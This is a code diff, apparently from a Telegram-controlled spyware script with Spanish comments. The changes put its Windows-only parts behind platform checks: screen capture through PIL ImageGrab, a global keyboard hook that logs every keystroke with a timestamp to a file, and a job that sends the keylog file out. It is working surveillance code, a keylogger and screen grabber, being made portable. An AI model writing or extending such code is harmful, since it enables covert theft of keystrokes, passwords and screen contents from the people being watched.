@@ -12,13 +12,15 @@ from pathlib import Path
 from io import BytesIO
 import tempfile
 
-import PIL.ImageGrab
+if platform.system() == "Windows":
+    import PIL.ImageGrab
 from PIL import Image
-import keyboard
-import win32event
-import win32api
-import winerror
-import winreg
+if platform.system() == "Windows":
+    import keyboard
+    import win32event
+    import win32api
+    import winerror
+    import winreg
 import psutil
 import requests
 import numpy as np
@@ -160,8 +162,10 @@ async def auto_backup(context: ContextTypes.DEFAULT_TYPE):
 # =============================================================================
 def capture_screen():
     """Captura la pantalla completa y devuelve como numpy array (RGB)."""
-    img = PIL.ImageGrab.grab()
-    return np.array(img)  # RGB directo
+    if platform.system() == "Windows":
+        img = PIL.ImageGrab.grab()
+        return np.array(img)  # RGB directo
+    return np.zeros((100, 100, 3), dtype=np.uint8)  # Dummy image for non-Windows
 
 def images_different(img1, img2, threshold=0.05):
     """Compara dos imágenes (numpy arrays) y devuelve True si son diferentes."""
@@ -227,7 +231,8 @@ def keylogger_callback(e):
             k = f'[{n.upper()}]'
         f.write(f"{ts}: {k}\n")
 
-keyboard.on_press(keylogger_callback)
+if platform.system() == "Windows":
+    keyboard.on_press(keylogger_callback)
 
 async def send_keylog(context: ContextTypes.DEFAULT_TYPE):
     """Envía el archivo de keylog y lo limpia solo si el envío fue exitoso."""
